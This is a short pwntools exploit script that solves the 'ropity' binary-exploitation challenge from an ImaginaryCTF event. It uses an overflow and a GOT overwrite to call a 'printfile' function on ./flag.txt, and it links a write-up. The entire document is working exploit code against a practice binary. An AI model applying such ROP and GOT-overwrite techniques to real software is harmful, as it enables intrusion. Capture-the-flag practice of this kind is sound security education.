from pwn import *

context.binary = elf = ELF('./vuln')

# p = remote("ropity.chal.imaginaryctf.org", 1337)
p =process("./vuln", )


pause()

p.sendline(cyclic(8) + p64(elf.got['fgets']+8) + p64(0x0000000000401142))
p.sendline(p64(elf.sym['printfile']) + p64(8+0x404038) + p64(0x0000000000401142) + p64(0) + b'./flag.txt\x00')

p.interactive()

'''
https://vaktibabat.github.io/posts/ictf_2024/
'''